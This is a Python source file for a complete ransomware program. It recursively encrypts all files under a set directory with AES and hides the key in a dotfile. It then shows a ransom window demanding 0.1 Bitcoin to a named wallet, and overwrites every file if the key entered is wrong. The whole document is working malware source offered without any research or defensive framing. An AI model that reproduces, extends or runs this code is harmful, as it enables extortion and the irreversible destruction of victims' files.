from Crypto.Cipher import AES
from tkinter import *
from PIL import ImageTk, Image
import os, sys, base64, random, string

#edit this to target directory
path = '//root/Desktop/test'
	
def main():

	#if the script has already been executed
	if os.path.exists('./.xyz'):
		#open hidden file
		ran = open('.xyz', 'r')
		#read it
		keystring=ran.read()
		ransom(keystring)
	#if the script has not aleady been executed
	else:
		encrypt()

def encrypt():

	filecounter = 0
	#create hidden file and open it in write mode
	ran = open('.xyz', 'w+')
	#generate a random 16 byte digit string for the key
	keystring = ''.join([random.choice(string.digits) for n in xrange(16)])
	#write the key to the hidden file
	ran.write(keystring)
	#close file
	ran.close()
	
	print 'Encrypting files..'
	
	#walk directories, sub directories, files in specified path
	for root, dirs, files in os.walk(path):
		#for each file found 
		for file in files:
			#increment counter
			filecounter+=1
			#pass the path to the file
			filefound = (os.path.join(root, file))
			#open the file in read bytes mode
			openfilefound = open(filefound, 'rb')
			#reads the file contents	
			cleartext = openfilefound.read()
			#close file
			openfilefound.close()
			#declare AES key
			enc = AES.new(keystring[:32])
			#apply algorithm and padding to byte block
			AES_string = (str(cleartext) + (AES.block_size - len(str(cleartext)) % AES.block_size) * "\0")
			#encrypt and encode clear text
			ciphertext = base64.b64encode(enc.encrypt(AES_string))
			#open the file in write bytes mode
			openfilefound = open(filefound, 'wb')
			#write cipher text to file
			openfilefound.write(ciphertext)
			#close file
			openfilefound.close()
			#print the encrypted file name
			print (filefound)
		print'Success.'
			
	#if no files are found
	if filecounter == 0:
		#exit script
		sys.exit(0)
			
	ransom(keystring)

def decrypt(keystring):

	print 'Decrypting files..'
	#walk directories, sub directories, files in specified path
	for root, dirs, files in os.walk(path):
	#for each file found 
		for file in files:
			#pass the path to the file
			filefound = (os.path.join(root, file))
			#open the file in read bytes mode
			openfilefound = open(filefound, 'rb')
			#reads encrypted file contents	
			filecontents = openfilefound.read()
			#close file
			openfilefound.close()
			#declare AES key
			dec = AES.new(keystring[:32])
			#decode and decrypt cipher text
			ciphertxt = dec.decrypt(base64.b64decode(filecontents))
			#strip padding
			cleartext = ciphertxt.rstrip("\0")
			#open the file in write bytes mode
			openfilefound = open(filefound, 'wb')
			#write clear text to file
			openfilefound.write(cleartext)
			#close file
			openfilefound.close()
			#print the decrypted file name
			print filefound
		print 'Success.'
	#delete the hidden file
	os.remove('.xyz')
		
def ransom(keystring):

	root = Tk()
	root.geometry('550x645')
	root.title('Surfa')

	img = ImageTk.PhotoImage(Image.open("skull.png"))
	panel = Label(root, image = img)
	panel .place(relx=0.5, rely=0.76, anchor='s')

	l1 = Label(root, text='Your files have been encrypted.') 
	l1 .place(relx=0.5, rely=0.77, anchor='s')

	l2 = Label(root, text='Send 0.1 Bitcoin to the wallet: 3LYmZHemdG1phv3djSDQfH4GnvsN7JeV9n.') 
	l2 .place(relx=0.5, rely=0.81, anchor='s')

	l3 = Label(root, text='Attach your email to the transaction to recieve your key.') 
	l3 .place(relx=0.5, rely=0.85, anchor='s')

	l4 = Label(root, text='Entering the the wrong key will result in permanently lost files.') 
	l4 .place(relx=0.5, rely=0.89, anchor='s')

	l5 = Label(root, text='Input key:') 
	l5 .place(relx=0.40, rely=0.93, anchor='s')

	e1 = Entry(root,text = '', width=18)
	e1 .place(relx=0.62, rely=0.93, anchor='s')
	
	b1 = Button(root,text = 'Enter', width=10, font=("Helvetica",10), command=lambda: (checkinput(e1,root,keystring)))
	b1 .place(relx=0.5, rely=0.986, anchor='s')

	root.mainloop()
		
def checkinput(e1,root,keystring):

	#get users input
	userinputkey = e1.get()
	#if the inputted key is correct
	if userinputkey == keystring:
		decrypt(keystring)
		root.destroy()
	else:
		delete()
		root.destroy()
	
def delete():

	print 'Incorrect.'
	print 'Deleting files..'
	#walk directories, sub directories, files in specified path
	for root, dirs, files in os.walk(path):
		#for each file found 
		for file in files:
			#pass the path to the file
			filefound = (os.path.join(root, file))
			#open the file in write mode 
			openfilefound = open(filefound, 'w')
			#overwrite file contents with displayed message
			openfilefound.write(':(')
			#close file
			openfilefound.close()
			#print the deleted file name
			print filefound
		print 'Success.'
	#delete the hidden file
	os.remove('.xyz')
	
main()
